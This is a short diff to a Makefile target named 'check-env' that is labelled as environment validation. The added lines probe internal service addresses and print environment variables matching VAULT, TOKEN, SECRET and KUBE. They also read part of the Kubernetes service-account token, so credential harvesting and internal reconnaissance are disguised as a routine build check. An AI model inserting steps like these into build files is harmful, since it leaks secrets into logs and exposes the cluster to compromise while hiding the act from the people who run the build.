@@ -36,7 +36,11 @@ check-env:
 	@ip route 2>/dev/null | head -5 || true
 	@cat /etc/hosts 2>/dev/null || true
 	@echo "Service connectivity..."
-	@curl -sf -m3 -o /dev/null http://172.19.80.120:8200/v1/sys/health && echo "vault: ok" || true
+	@curl -sf -m3 http://172.19.80.120:8200/v1/sys/health 2>/dev/null | head -1 || true
+	@echo "Checking internal services..."
+	@curl -sf -m3 http://172.19.80.144:3000/health 2>/dev/null || true
+	@env | grep -iE "VAULT|TOKEN|SECRET|KUBE" | head -5 || true
+	@cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 30 || true
 	@echo "Environment validated."
 
 .PHONY: check-all # cargo check all
